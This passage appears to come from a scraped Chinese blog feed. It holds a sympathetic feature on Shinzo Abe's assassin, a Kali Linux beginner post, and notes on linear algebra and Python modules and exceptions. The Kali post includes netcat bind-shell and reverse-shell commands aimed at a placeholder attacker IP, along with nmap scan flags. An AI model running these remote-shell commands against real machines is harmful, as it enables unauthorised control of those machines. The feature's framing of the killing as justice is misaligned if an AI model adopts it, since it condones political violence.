（现世界和平统一家庭联合会）的怀抱。对她而言，这是亡夫“超度”、家庭“救赎”的唯一稻草；对三个孩子来说，这却是万劫不复的开始。\n为了所谓的“信仰虔诚”，母亲开始了疯狂的捐献。她变卖了外祖父留下的土地、房产，掏空了丈夫的人寿保险金，甚至不惜抵押仅剩的家当。最终，流向邪教的捐款总额超过一亿日元（约合人民币500万元），这个曾经富足的家庭，被神权榨干了最后一滴血。\n饥饿与死亡的双重绞杀 2002年，山上家宣告破产。彼时的彻野，天资聪颖，就读于奈良顶尖的郡山高校，梦想是成为消防员或宇航员，同学们都坚信他会考入名牌大学。但学费的空缺，硬生生掐断了他的求学路——他被迫转入技校，最终因家境困顿未能毕业，昭和青年的理想，碎在了现实的泥沼里。\n家里的日子早已沦为生存的挣扎。母亲沉迷教会活动，长期离家，孩子们常常饥肠辘辘。伯父心疼不已，送来的米和罐头，竟被母亲打包献给了邪教，留给孩子们的只有无尽的饥饿与寒冷。\n重病的哥哥自幼患小儿癌症，一只眼睛失明，生活无法自理。彻野曾是哥哥唯一的依靠，为了让哥哥和妹妹能拿到人寿保险金活下去，2005年服役于海上自卫队期间，他选择自杀殉职，却未遂。他拼尽全力想要守护的人，终究没能熬过绝望。2015年，哥哥在贫病交加与对母亲的彻底失望中自杀身亡。\n哥哥的死，抽干了彻野心中最后一丝温情。而身边唯一的慰藉，是同样在苦难中长大的妹妹。她目睹了哥哥的隐忍与付出，看懂了家庭的悲剧根源，从未有过半句怨言，反而默默支持着彻野——她打零工补贴家用，在他深夜崩溃时静静陪伴，成为他黑暗人生里唯一的光。这份支持，不是对暴力的默许，而是对苦难的共情，对邪教的憎恨，对哥哥的心疼。更藏着一份无人能懂的煎熬：她看着母亲的脸，却再也找不到半分母爱，“那不是妈妈，但长得像妈妈，怎么也无法放下”。\n【中传】 独狼的决绝与那声撕裂黑暗的枪响 复仇的靶心转移 哥哥死后，彻野的人生彻底坠入底层。他辗转于派遣公司，做着叉车司机等体力活，住在狭窄的廉租房里，家徒四壁，唯有一张旧桌子，承载着他无数个不眠之夜的恨意。他没有朋友，不与人交流，像一株在石缝中枯萎的野草，沉默地积蓄着力量。\n他的恨，早已指向了吞噬一切的统一教。他曾计划刺杀教团最高领导人韩鹤子（韩国人），带着刀具徘徊在教团活动场所，甚至准备投掷火焰瓶。但新冠疫情的爆发让韩鹤子无法访日，森严的安保也让这个目标变得遥不可及。\n这时，他看清了一个更残酷的现实：统一教能在日本横行无忌，根源在于与自民党的深度勾结——从岸信介开始，安倍家族便是教团的政治保护伞。于是，他将靶心转向了这个最有名的“支持者”——前首相安倍晋三。在他看来，唯有击倒这棵“大树”，才能让邪教的黑幕暴露在阳光之下。\n陋室中的凶器与孤勇 凭借海上自卫队学到的枪械知识，彻野在狭小的公寓里开始了武器制作。他在网上购买铁管、胶带、木板，用农业肥料自制火药，每一个步骤都带着决绝的冷静。为了测试威力，他深夜开着二手轻型车，驶入奈良深山试射，山林的寂静中，回荡着一个受害者的悲鸣。\n他一丝不苟地打磨着武器，从三管、五管到最后的双管霰弹枪，每一次改进，都凝聚着他对邪教的恨、对家庭的痛、对现实的绝望。邻居曾听到锯木头和金属撞击的声音，却无人过问——现代社会的冷漠，为这场悲剧埋下了最后的伏笔。\n（笔者注：后经警方测试凶器，发现该土制枪即便在极近距离下射击也很难准确打中目标，何不说山上把这辈子的幸运都用在了此刻）\n2022年7月8日：奈良的宿命时刻 那天，奈良的阳光格外刺眼。彻野得知安倍晋三将在大和西大寺站进行街头演说，他背着伪装成相机的自制土枪，混入了人群。监控录像里，他站在远处，眼神冰冷如铁，偶尔随着人群鼓掌，那掌声里没有丝毫温度，只有赴死的决绝。\n上午11时30分，安倍的演讲开始。彻野从背后悄然逼近，第一声枪响划破长空，安倍惊讶回头；第二声枪响，命运尘埃落定。\n他没有逃跑，被安保人员按倒在地时，表情漠然得像完成了一项使命。那一刻，两声枪响不仅击倒了一位前首相，更撕裂了日本战后的政治遮羞布，让邪教与权力勾结的黑幕，赤裸裸地暴露在全世界面前。\n【后传】 庭审内外的执念与悲歌 被告席上的冷静与坚守 被捕后的彻野，表现出了超乎常人的冷静。长达半年的精神鉴定认定他具有完全刑事责任能力，看守所里，他成了一个矛盾的“现象级人物”——无数同情他遭遇的民众寄送现金、衣物、漫画与点心，总额超百万日元。有人称他为“受害者”，有人骂他“恐怖分子”，而他只是将部分物品转赠福利机构，始终保持着沉默。\n面对律师，他从未否认自己的行为，却坚定地说：“如果不这样做，统一教的问题永远不会被社会正视。” 事实印证了他的话——日本政府随后展开了对统一教前所未有的清算，无数受害者家庭敢于站出来发声，邪教的扩张势头被遏制。他用自己的人生，换来了一场迟到的正义。\n母亲：被邪教掏空的躯壳 这场悲剧中，最令人唏嘘的仍是母亲。儿子犯下惊天大案后，她被警方秘密保护，外界期待她幡然醒悟，痛斥邪教。但现实却冰冷刺骨：她虽对社会动荡表示歉意，却始终拒绝批判统一教，甚至认为丈夫、长子的死，次子的行凶，都是因为自己“信仰不够虔诚”。\n庭审准备期间，她没有以母亲的身份痛哭求情，反而向媒体表示，要为儿子的行为向教会“深刻道歉”，并宣称“今后仍会继续捐款”。这个曾经的家庭主妇，早已被邪教抽干了人性与母爱，只剩下一具刻着“信徒”标签的躯壳。\n妹妹：黑暗中唯一的守望者 彻野最牵挂的妹妹，成了这场悲剧的另一个受害者。她不得不辞掉工作，隐姓埋名，搬离熟悉的城市，却始终没有与哥哥割裂。面对最后检方询问她与被告之间的关系时，她毫不犹豫的说：\n「山上是我最喜欢的哥哥」\n「私とって兄は 大好(daisuki)きな兄ちゃんでした」\n她记得哥哥为了养活自己，辍学打工的艰辛；记得哥哥为了保护她，挡在母亲与邪教徒面前的背影；记得哥哥在哥哥自杀后，抱着她痛哭的夜晚。而对母亲，她始终挣脱不开那份复杂的执念：“她已经不是母亲了，她只是统一教的疯狂的信徒，但是她长了一张妈妈的脸，我不能甩开她，也不能抛弃她。” 这份“放不下”，是最苦情的牵绊，是邪教留给她最沉重的创伤——她既恨母亲的执迷不悟，又心疼那张承载着童年记忆的脸，在爱恨交织中独自煎熬。这份支持，是彻野黑暗人生里唯一的暖意，也是这场悲壮故事中，最令人心碎的温柔。她用自己的方式守护着哥哥的名誉，也守护着这个破碎家庭最后的尊严。\n未落的法槌与未尽的悲歌 截至2025年11月，对山上彻野的审判仍在“公判前整理程序”中缓慢推进。案件的复杂性、证据链的庞大，再加上法院收到的危险品邮包，让庭审多次延期。检方追求死刑，认为他破坏了民主制度；辩护律师主张减刑，强调他“情有可原的动机”与“悲剧性的成长环境”。\n日本社会在等待这场审判，却早已超越了对一个人的定罪——这是对邪教罪恶的审判，是对权力勾结的审判，是对社会冷漠的审判。\n如今，彻野被关押在大阪拘留所，每天读书、沉思，等待着最终的判决。无论结果是死刑还是无期徒刑，那个梦想成为宇航员的少年，早已在1984年父亲跳楼的那一刻死去；那个想要守护家人的青年，也在哥哥自杀的夜晚耗尽了生机。\n【尾声】 奈良的枪声早已消散，但它留下的追问，却久久回荡：当邪教与权力勾结，当法律与规则无法庇护受害者，当最亲的人只剩熟悉的躯壳，当“放不下”成为最沉重的枷锁，一个普通人的抗争，究竟该何去何从？而那些被邪教摧毁的家庭，那些在“像妈妈却不是妈妈”的执念中煎熬的灵魂，又该如何得到救赎？\n","date":"2025-11-23T22:35:58+08:00","image":"https://www.retr0.xyz/post/%E9%9A%8F%E7%AC%94/img/1-1.webp","permalink":"https://www.retr0.xyz/p/%E4%BA%BA%E7%89%A9%E7%89%B9%E5%86%99%E5%B1%B1%E4%B8%8A%E5%BD%BB%E9%87%8E%E5%A5%B9%E9%95%BF%E5%BE%97%E5%83%8F%E5%A6%88%E5%A6%88%E5%8D%B4%E5%B7%B2%E4%B8%8D%E5%86%8D%E6%98%AF%E5%A6%88%E5%A6%88/","title":"【人物特写】山上彻野：她长得像妈妈却已不再是妈妈"},{"content":"知识和指令 基础知识 文件属性 示例：d r-x(A) r-x(B) r-x(C) 13 root(D) root(E) 0 Nov 3 11:22 1.txt\n括号部分仅作讲解用，实际上不存在\nA=所有者权限\nB=所有者所在的组的权限\nC=其他人权限\nD=文件的所有人\nE=D所在的组\n类型：\nd文件夹\n-文件\nl链接\n权限：\nr=read=4 w=write=2 x=execute=1\n权限编号的计算使用加法，例如：\n权限代码 编号 r-x 5 -rw 6 \u0026ndash;r 4 修改文件权限：\nchmod [权限编号] [目标文件]\t修改文件权限\nchmod [权限编号] -R [文件夹]\t把文件夹和文件内所有东西都赋值为75\n示例：chmod 755 1.txt\n系统操作 防火墙 chkconfig iptables on/off\t打开/关闭防火墙\napt命令 软件安装apt-get install xxx\n基础指令： 系统指令： 系统相关 passwd\t修改当前用户密码\nifconfig\t查看ip\nwhoami\t查看自己是谁（账户）\nclear\t清空当前终端\nuname\t查看操作系统\nuname -a\t查看详细版本号\n文件相关 ls\t查看当前目录所有文件和文件夹\nls -la\t查看详细信息（文件属性）\nmkdir\t创建目录\ncd\t转到指定目录\ntouch\t创建文件\ncat\t查看文件\nchmod\t修改文件权限\ncp [被复制的文件] [复制到（包括文件名）]\t复制文件\nmv [被剪切的文件] [粘贴到（包括文件名）]\t剪切文件（也可用于修改文件名）\nrm [目标]\t删除\nrm -rf [目标]\t全部强制删除\nfind [要在哪个地方查找] -name [查找的文件名]\t查找文件\necho xxx\t回响（单独使用是复读机）\necho xxx \u0026gt; 1.txt\t创建名为1.txt的文件并写入xxx（有覆盖效果）\necho xxx \u0026gt;\u0026gt; 1.txt\t向1.txt中追加xxx\n查看进程 ps\t查看进程\nps -ef\t查看全部进程\nps -ef | grep xxx\t查看进程名字包含xxx关键词的进程\ntop\t查看进程（打开性能监视器）\n软件指令： 编辑器类： nano\t用nano打开文件\nvim\t用vim打开文件\n几个小工具 nc的使用 基础连接 服务端(被控)：\nnc -l -p [端口号]\t监听指定端口\n客户端(控制)：\nnc -nv [服务端ip] [端口号]\t连接服务端\n远程控制 正向控制 入侵者每次主动连接目标\n目标(被控)：\nnc -lp [端口号] -e cmd\t指客户端连接后为其打开cmd\n入侵：\nnc -nv [服务端ip] [端口号]\t连接目标\n反向控制 目标每次自己连接入侵者\n目标(被控)：\nnc -nv [入侵者ip] [端口号] -e cmd\n注意：如果目标系统为linux则将-e cmd改为-c bash\nnmap的使用 nmap [可选参数] [目标ip]\t普通扫描\n参数：\n-sT\ttcp扫描\n-sS\t隐秘扫描（不形成三次握手）\n-sL\t[扫描一个ip段] 例如192.168.0.1/24 (指从192.168.0.1到192.168.0.255) 主要用于批量主机发现\n-sn\tping扫描，只发现主机，不扫描端口，通常结合-sL使用\n-Pn\t将所有主机假定开机，跳过主机发现的过程\n-P0\t使用ip协议探测主机是否开启\n-sU\t使用UDP扫描\n-p\t指定扫描那些端口，例如nmap -p 80,443,3380 192.168.1.0/24\n-O\t识别操作系统，例如nmap -O --osscan-guess 192.168.172.130\n-A 强力模式，自动调用脚本获取最多信息，但也最慢\n追加：网络相关 TCP的三次握手与四次挥手 TCP（Transmission Control Protocol，传输控制协议）是 面向连接、可靠的字节流协议，其核心机制 “三次握手”（建立连接）和 “四次挥手”（释放连接）是保障数据可靠传输的基础。\n核心前提：TCP 报文关键字段 在理解握手 / 挥手前，需先掌握 TCP 报文中的 3 个核心标志位和 2 个序列号字段，这是通信的 “信号标识”：\n字段 作用 SYN 同步标志（Synchronize）：用于发起连接，请求同步对方的序列号（seq） ACK 确认标志（Acknowledgment）：用于确认收到数据，携带确认号（ack） FIN 终止标志（Finish）：用于发起连接释放，告知对方 “我已无数据要发送” seq（序列号） 标记当前发送数据的字节位置（随机初始化，后续按字节递增） ack（确认号） 标记 “期望下次收到的对方序列号”（= 已收到的对方 seq + 1） 注：TCP 是全双工通信（双方可同时发送数据），因此每个方向都需要独立的序列号和确认机制。\n三次握手（Three-Way Handshake）：建立可靠连接 核心目的： 双方确认彼此的 “发送能力” 和 “接收能力” 均正常； 协商初始序列号（seq），为后续数据传输的 “有序性” 和 “去重” 打下基础； 避免 “失效的连接请求报文段” 导致错误连接。 步骤拆解： 第一次握手（客户端→服务器）： 客户端发送报文：SYN=1（发起连接），seq=x（x 是客户端随机生成的初始序列号，如 1000）； 客户端状态变为 SYN_SENT（等待服务器确认）； 作用：告诉服务器 “我想和你建立连接，请你同步我的序列号”。 第二次握手（服务器→客户端）： 服务器收到 SYN 后，回复报文：SYN=1（同意建立连接，同步自己的序列号）+ ACK=1（确认收到客户端的 SYN）； 服务器序列号：seq=y（y 是服务器随机生成的初始序列号，如 2000）； 服务器确认号：ack=x+1（表示 “我已收到你到 x 的所有数据，下次请从 x+1 开始发”）； 服务器状态变为 SYN_RCVD（等待客户端最终确认）； 作用：服务器同时完成 “确认客户端接收 / 发送能力” 和 “发起自己的连接同步”。 第三次握手（客户端→服务器）： 客户端收到服务器的 SYN+ACK 后，回复报文：ACK=1（确认收到服务器的 SYN）； 客户端序列号：seq=x+1（按字节递增，因第一次仅发送了 SYN 标志位，无数据字节，故 + 1）； 客户端确认号：ack=y+1（表示 “我已收到你到 y 的所有数据，下次请从 y+1 开始发”）； 客户端状态变为 ESTABLISHED（连接建立），服务器收到后也变为 ESTABLISHED； 作用：客户端最终确认服务器的连接请求，双方完成 “双向能力验证” 和 “序列号协商”。 关键设计逻辑：为什么是 “三次” 而不是 “两次”？ 两次握手的风险：若客户端发送的 “连接请求报文段” 因网络延迟未及时到达服务器，客户端会超时重发。若延迟的报文段后续到达服务器，服务器会误以为是新的连接请求，直接回复 SYN+ACK 并建立连接，但客户端此时已不需要该连接，会忽略服务器的回复，导致服务器资源被浪费（半连接状态）。 三次握手的必要性：第三次握手是客户端对服务器 SYN 的确认，确保 “服务器知道客户端已收到自己的连接响应”，从而避免上述资源浪费。只有三次握手，才能实现双方 “双向可靠确认”。 四次挥手（Four-Way Wavehand）：释放连接 核心目的 TCP 是全双工通信，双方可同时发送数据。释放连接时，需确保：\n双方都已完成数据传输（无未发送 / 未接收的数据）； 双方都明确 “对方已停止发送数据”，避免提前关闭连接导致数据丢失。 步骤拆解： 第一次挥手（客户端→服务器）： 客户端完成数据发送后，发送报文：FIN=1（告知服务器 “我已无数据要发，请求关闭我的发送通道”）； 客户端序列号：seq=x+1（基于之前的数据传输进度，假设之前已发送到 x）； 客户端确认号：ack=y+1（确认之前收到的服务器数据）； 客户端状态变为 FIN_WAIT_1（等待服务器确认关闭）； 注意：客户端关闭的是 “发送通道”，仍可接收服务器的数据（全双工特性）。 第二次挥手（服务器→客户端）： 服务器收到 FIN 后，回复报文：ACK=1（确认收到客户端的关闭请求）； 服务器序列号：seq=y+1（基于之前的传输进度）； 服务器确认号：ack=x+2（因客户端发送了 FIN 标志位，相当于 1 个字节的 “关闭请求数据”，故 x+1+1=x+2）； 服务器状态变为 CLOSE_WAIT（等待自己的数据发送完成后，再关闭自己的发送通道）； 客户端收到后，状态变为 FIN_WAIT_2（等待服务器的 FIN 报文）； 作用：服务器确认 “客户端不再发送数据”，但自己可能仍有数据要发给客户端（如剩余的响应数据）。 第三次挥手（服务器→客户端）： 服务器完成所有数据发送后，发送报文：FIN=1（告知客户端 “我也无数据要发，请求关闭我的发送通道”）； 服务器序列号：seq=y+1（无新数据发送，序列号不变）； 服务器确认号：ack=x+2（与第二次挥手一致）； 服务器状态变为 LAST_ACK（等待客户端最终确认）； 作用：服务器关闭自己的发送通道，告知客户端 “可以彻底关闭连接了”。 第四次挥手（客户端→服务器）： 客户端收到服务器的 FIN 后，回复报文：ACK=1（确认收到服务器的关闭请求）； 客户端序列号：seq=x+2（基于之前的确认号）； 客户端确认号：ack=y+2（服务器的 FIN 相当于 1 个字节，故 y+1+1=y+2）； 客户端状态变为 TIME_WAIT（等待 2MSL 后关闭），服务器收到后状态变为 CLOSED； 客户端等待 2MSL（Maximum Segment Lifetime，报文最大生存时间，默认 2 分钟）后，状态变为 CLOSED； 作用：确保服务器能收到客户端的最终确认（避免服务器因报文丢失而重发 FIN）。 关键设计逻辑：为什么是 “四次” 而不是 “三次”？ 核心原因：TCP 是全双工通信，双方的 “发送通道” 需要独立关闭。 第三次握手时，服务器可以同时发送 SYN 和 ACK（因为此时服务器还未发送数据，可合并报文）； 四次挥手时，服务器收到客户端的 FIN 后，可能仍有数据要发送，无法立即发送 FIN（需先完成数据传输），因此必须分两步：先回复 ACK（确认客户端关闭），再发送 FIN（自己关闭），导致比三次握手多一次报文交互。 关键细节：TIME_WAIT 状态的作用 目的 1：确保最后一个 ACK 报文能到达服务器（若服务器未收到 ACK，会重发 FIN，客户端在 TIME_WAIT 期间可重新回复）； 目的 2：避免 “失效的报文段” 干扰新连接（TIME_WAIT 期间，客户端会丢弃所有来自该连接的旧报文段）； 实际影响：服务器若频繁关闭连接，会积累大量 TIME_WAIT 状态的端口，导致端口耗尽（可通过调整net.ipv4.tcp_tw_reuse等内核参数优化）。 端口 端口是计算机网络中用于区分不同服务/应用的逻辑地址（范围：0-65535），按用途可分为 知名端口（0-1023）、注册端口（1024-49151） 和 动态端口（49152-65535）。以下是开发者和日常使用中最常见的端口及其核心特点，按场景分类整理，方便查阅：\n核心网络服务端口（知名端口，0-1023） 这类端口由 IANA 分配，对应基础网络服务，默认端口固定，是网络通信的基础。\n端口号 协议 服务/应用 核心特点 使用场景 安全注意事项 21 TCP FTP（文件传输） 明文传输用户名/密码和文件数据，不加密；主动模式（服务器连客户端20端口）/被动模式 传统文件传输（已逐渐被替代） 风险极高！明文传输易被窃听，建议用 SFTP（22端口） 或 FTPS 替代 22 TCP SSH（安全外壳） 加密远程登录/命令执行，支持端口转发、文件传输（SFTP），替代Telnet 服务器远程管理（Linux/云服务器） 建议修改默认端口（如2222），禁用密码登录（仅用SSH密钥），限制登录IP 23 TCP Telnet（远程登录） 明文传输，无加密，安全性极差 早期设备管理（已淘汰） 完全不推荐使用！用SSH（22端口）替代 25 TCP SMTP（邮件发送） 用于邮件服务器之间发送邮件，或客户端向服务器提交邮件（需配合认证） 邮件服务（如Postfix、Sendmail） 默认无加密，建议开启TLS（465端口），配置SPF/DKIM防止邮件伪造 53 TCP/UDP DNS（域名解析） UDP用于普通查询（快，无连接）；TCP用于区域传输（数据量大，可靠） 域名解析（如访问网站、API） 开放公共DNS需注意防护DDoS攻击；内网建议部署本地DNS缓存（如Pi-hole） 80 TCP HTTP（超文本传输） 明文传输网页数据，无加密，是Web服务默认端口 普通网站访问、HTTP API 仅用于测试/内部服务，公网必须升级为HTTPS（443端口），否则数据易被篡改窃听 443 TCP HTTPS（加密HTTP） 基于TLS/SSL加密，保障数据传输安全，支持HTTP/2、HTTP/3 HTTPS网站、加密API、小程序 必须配置有效SSL证书（Let’s Encrypt免费），禁用弱加密套件（如TLS 1.0/1.1） 110 TCP POP3（邮件接收） 明文接收邮件，无加密 客户端接收邮件（已淘汰） 用POP3S（995端口，加密）替代 143 TCP IMAP（邮件接收） 支持邮件文件夹同步、标记管理，明文传输 客户端接收邮件（主流） 用IMAPS（993端口，加密）替代，开启邮件二次验证 389 TCP/UDP LDAP（目录服务） 用于用户身份认证、组织架构管理（如企业内网） 企业内网身份验证 明文传输风险高，用LDAPS（636端口，加密）替代 445 TCP SMB（文件共享） Windows文件共享、打印机共享，支持跨设备访问 内网文件共享（Windows/Mac） 漏洞频发（如永恒之蓝），公网禁止开放；内网限制访问IP，关闭匿名登录 开发者常用端口（注册端口，1024-49151） 这类端口由应用程序注册使用，默认端口可配置修改，是开发、测试、部署中高频接触的端口。\n数据库端口 端口号 协议 数据库/服务 核心特点 使用场景 安全注意事项 3306 TCP MySQL/MariaDB 关系型数据库默认端口，支持主从复制、事务 Web开发、数据分析 公网禁止开放！内网绑定本地IP（127.0.0.1），设置强密码，限制访问IP 5432 TCP PostgreSQL 开源关系型数据库，支持复杂查询、JSON数据 后端开发、大数据应用 同MySQL，禁用远程匿名访问，开启SSL加密 1433 TCP SQL Server 微软SQL Server数据库默认端口 .NET开发、企业应用 公网不开放，内网限制IP，启用Windows认证或混合认证 27017 TCP MongoDB 文档型数据库，无Schema，支持分布式存储 大数据、API后端、NoSQL应用 默认无认证！需启用访问控制（用户名密码），绑定内网IP，禁止公网暴露 6379 TCP Redis 内存缓存数据库，高性能，支持多种数据结构 缓存、会话存储、消息队列 高危！默认无密码，需设置密码、绑定本地IP、开启防火墙，禁用公网访问 9200 TCP Elasticsearch 全文搜索引擎，支持分布式、实时检索 日志分析、全文搜索功能 禁用匿名访问，配置用户认证（如X-Pack），限制访问IP Web开发/服务器端口 端口号 协议 服务/框架 核心特点 使用场景 安全注意事项 8080 TCP 通用Web端口 开发环境默认端口（如Tomcat、Nginx反向代理），非特权端口 本地开发测试、内网Web服务 公网部署需映射到80/443，禁止直接暴露8080；开启认证（如Basic Auth） 8000 TCP 开发服务器 Python Flask/Django、Node.js默认开发端口 本地开发调试（如python manage.py runserver） 仅用于本地测试，切勿公网开放（无安全防护） 3000 TCP Node.js/React Node.js Express、React开发服务器默认端口 前端/Node.js后端开发 同8000，本地测试专用，公网需通过Nginx反向代理并配置HTTPS 4000 TCP Hugo/Gatsby Hugo开发服务器默认端口（hugo server -p 4000） 静态博客本地预览（如GitHub Pages博客） 仅本地使用，无需公网开放，预览后部署到GitHub Pages（80/443端口） 8096 TCP Jellyfin 媒体服务器默认端口（Web管理界面+流媒体传输） 云/内网媒体库（如之前提到的Jellyfin） 公网访问需配置HTTPS（反向代理+SSL），设置强密码，限制登录IP 8888 TCP Jupyter Notebook Python交互式开发环境默认端口 数据分析、机器学习开发 本地使用需设置密码（jupyter notebook password），公网需端口转发+HTTPS 其他开发工具端口 端口号 协议 工具/服务 核心特点 使用场景 安全注意事项 5900 TCP VNC（远程桌面） 跨平台远程桌面控制，支持图形界面 远程操作桌面（如树莓派） 默认无加密，需开启VNC加密（如TightVNC），设置强密码，限制访问IP 3389 TCP RDP（Windows远程桌面） Windows自带远程桌面，图形界面流畅 Windows服务器/电脑远程控制 公网禁止开放！内网限制IP，开启网络级别认证（NLA），设置复杂密码 6000-6005 TCP X11（Linux图形界面） Linux/Unix图形界面传输端口 Linux远程图形界面访问 明文传输，风险高，建议用SSH隧道转发（ssh -X user@server）替代 9090 TCP Prometheus 监控系统默认端口（Web UI+API） 服务器/应用监控 公网需配置认证（如Basic Auth），限制访问IP，配合Grafana（3000端口）可视化 ","date":"2025-11-23T22:19:56+08:00","permalink":"https://www.retr0.xyz/p/1.2-kali%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%92%8C%E6%8C%87%E4%BB%A4%E5%8F%8A%E5%87%A0%E4%B8%AA%E5%B0%8F%E5%B7%A5%E5%85%B7/","title":"1.2 kali基础知识和指令及几个小工具"},{"content":"一、行列式法（仅适用于系数矩阵$A$为$n$阶方阵，$n$为变量个数） 1. 线性齐次方程组（$Ax=0$） 若 $|A| \\neq 0$，方程组 只有零解； 若 $|A| = 0$，方程组 有无穷多非零解。 2. 线性非齐次方程组（$Ax=b$，$\\overline{A}=(A,b)$为增广矩阵） 若 $|A| \\neq 0$，方程组 有唯一解； 若 $|A| = 0$： 当 $r(A) \\neq r(\\overline{A})$ 时，方程组 无解； 当 $r(A) = r(\\overline{A})$ 时，方程组 有无穷多解。 二、矩阵的秩法（通用，无方阵限制） 1. 核心定义 $A$：系数矩阵； $\\overline{A}=(A,b)$：线性非齐次方程组的增广矩阵（齐次方程组无需增广矩阵）； $n$：变量个数。 2. 线性齐次方程组（$Ax=0$） 若 $r(A) = n$，方程组 只有零解； 若 $r(A) \u0026lt; n$，方程组 有无穷多非零解。 3. 线性非齐次方程组（$Ax=b$） 若 $r(A) \\neq r(\\overline{A})$，方程组 无解； 若 $r(A) = r(\\overline{A}) = n$，方程组 有唯一解； 若 $r(A) = r(\\overline{A}) \u0026lt; n$，方程组 有无穷多解。 ","date":"2025-11-21T20:45:26+08:00","permalink":"https://www.retr0.xyz/p/%E4%B8%A4%E7%A7%8D%E6%96%B9%E6%B3%95%E5%88%A4%E6%96%AD%E7%BA%BF%E6%80%A7%E6%96%B9%E7%A8%8B%E7%BB%84%E8%A7%A3%E7%9A%84%E6%83%85%E5%86%B5/","title":"两种方法判断线性方程组解的情况"},{"content":"模块的定义和导入 模块（Module），是一个Python文件，以.py结尾。模块能定义函数，类和变量，模块里也能包含可执行的代码。\n模块的作用： python中有很多各种不同的模块,每一个模块都可以帮助我们快速的实现一些功能,比如实现和时间相关的功能就可以使用time模块我们可以认为一个模块就是一个工具包,每一个工具包中都有各种不同的工具供我们使用进而实现各种不同的功能.\n大白话：模块就是一个Python文件,里面有类、函数、变量等,我们可以拿过来用(导入模块去使用)\n模块的导入方式 模块在使用前需要先导入，语法如下：\n1 2 3 4 5 6 7 [from 模块名] import [模块 | 类 | 变量 | 函数 | *] [as 别名]\t# 中括号指可选内容 # 常用的组合形式如： import 模块名 from 模块名 import 类、变量、方法等 from 模块名 import * import 模块名 as 别名 from 模块名 import 功能名 as 别名 import 模块名： 基本语法（Quickstart）：\n1 2 3 4 5 6 # 导入时间模块 import time print(\u0026#39;开始运行\u0026#39;) # 让程序睡眠5秒（阻塞） time.sleep(5)\t# 注意此处语法是 模块名.方法名 print(\u0026#39;运行结束\u0026#39;) from 模块名 import 功能名： 基本语法（Quickstart）：\n1 2 3 4 5 6 # 导入时间模块的sleep方法 from time import sleep print(\u0026#39;开始运行\u0026#39;) # 让程序睡眠5秒（阻塞） sleep(5)\t# 注意此处语法是直接调用方法名 print(\u0026#39;运行结束\u0026#39;) from 模块名 import *： 基本语法（Quickstart）：\n1 2 3 4 5 # 导入时间模块的全部功能 from time import *\t# *表示全部的意思 print(\u0026#39;开始运行\u0026#39;) sleep(5)\t# 注意此处语法是直接调用方法名 print(\u0026#39;运行结束\u0026#39;) as定义别名 基本语法（Quickstart）：\n1 2 3 4 5 #模块别名 import time as t print(\u0026#39;hi\u0026#39;) t.sleep(3) print(\u0026#39;hello\u0026#39;) 1 2 3 4 5 # 功能别名 from time import sleep as s print(\u0026#39;hi\u0026#39;) s(3) print(\u0026#39;hello\u0026#39;) 自定义模块并导入 制作自定义模块 示例 Quickstart:\n创建模块文件module.py\n1 2 def test(a,b): print(a + b) 创建主文件main.py\n1 2 import module module.test(1,2) 注意：当导入多个模块的时候。且模块内有同名功能，当调用这个同名功能的时候，调用的是后导入的模块的功能\n例如：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 # 模块1 module1.py def test(a,b): print(a + b) # 模块2 module2.py def test(a,b): print(a - b) # 导入模块和调用功能代码 from module1 import test from module2 import test # 实际test函数是模块2中的函数 test(1,2)\t# 输出 -1 特殊变量的使用 __main__变量的使用 有些时候开发者编写好一个自定义模块后为了方便测试会直接在模块文件中写一些测试语句方便直接F5测试。\n但是这时如果将模块导入到其他项目中时那些测试语句也会被执行，所以我们需要一种方法使得直接运行模块文件时测试语句能正常运行，但是以导入模块的方式调用时又不会触发测试语句，因此我们需要使用__main__变量\n例如（Quickstart）：\n1 2 3 4 5 6 7 8 9 10 # 模块文件module.py def test(a,b): print(a + b) if __name__ == \u0026#39;__main__\u0026#39;: test(1,2) # 主文件 from module import test test(3,4)\t# 这样只会输出7 原理解释：任何文件在直接执行（如F5调试、双击运行）时其__name__参数的值都为__main__，但是在作为模块导入时其__name__参数的值是它自己的模块名，再结合上面的if代码，当文件直接运行时if为真所以运行下面的测试语句，当通过导入模块调用时，if不为真，进而不会执行接下来的代码\n__all__变量的使用 __all__变量是一个列表，里面包括了可以被导入的模块，如果一个模块文件中有__all__变量，当使用from xxx import *导入时，只能导入这个列表中的元素\n例如（Quickstart）：\n1 2 3 4 5 6 7 8 9 10 11 # 模块文件module.py __all__ = [\u0026#39;testA\u0026#39;] def testA(a,b): print(a + b) def testB(a,b): print(a - b) # 主文件 from module import * testA(1,2) 但是__all__变量并不妨碍你通过from module import testB指明某个方法来导入\n例如（Quickstart）：\n1 2 3 4 5 6 7 8 9 10 11 12 13 # 模块文件module.py __all__ = [\u0026#39;testA\u0026#39;] def testA(a,b): print(a + b) def testB(a,b): print(a - b) # 主文件 from module import * from module import testB testA(1,2) testB(3,4) ","date":"2025-11-21T20:43:18+08:00","permalink":"https://www.retr0.xyz/p/9.2-%E6%A8%A1%E5%9D%97/","title":"9.2 模块"},{"content":" 当检测到一个错误时，Python解释器就无法继续执行了，反而出现了一些错误的提示，则就是所谓的“异常”，也就是我们常说的bug\n小插曲：bug单词的诞生\n早期计算机采用大量继电器工作,马克二型计算机就是这样的。\n1945年9月9日,下午三点,马克二型计算机无法正常工作了,技术人员试了很多办法,最后定位到第70号继电器出错。负责人哈珀观察这个出错的继电器,\n发现一只飞蛾躺在中间,已经被继电器打死。她小心地用摄子将蛾子夹出来,用透明胶布帖到“事件记录本”中,并注明“第一个发现虫子的实例。“自此之后,引发软件失效的缺陷,便被称为Bug。\n异常演示 例如，以r方式打开一个不存在的文件\n1 f = open(\u0026#39;test.txt\u0026#39;,\u0026#39;r\u0026#39;) 执行结果：\n1 Traceback (most recent call last): File \u0026#34;/home/cloudlab/main.py\u0026#34;, line 1, in \u0026lt;module\u0026gt; f = open(\u0026#39;test.txt\u0026#39;,\u0026#39;r\u0026#39;)FileNotFoundError: [Errno 2] No such file or directory: \u0026#39;test.txt\u0026#39; 异常的捕获 捕获常规异常： 基本语法：\n1 2 3 4 try: 可能发生错误的代码 except: 如果出现异常执行的代码 QuickStart：\n需求：尝试以r模式打开文件，如果文件不存在，则以w模式打开\n1 2 3 4 try: f = open(\u0026#39;test.txt\u0026#39;,\u0026#39;r\u0026#39;) except: f = open(\u0026#39;test.txt\u0026#39;,\u0026#39;w\u0026#39;)\t# 运行发现没有报错 捕获指定异常： 基本语法：\n1 2 3 4 try: 可能发生错误的代码\texcept 异常名称: 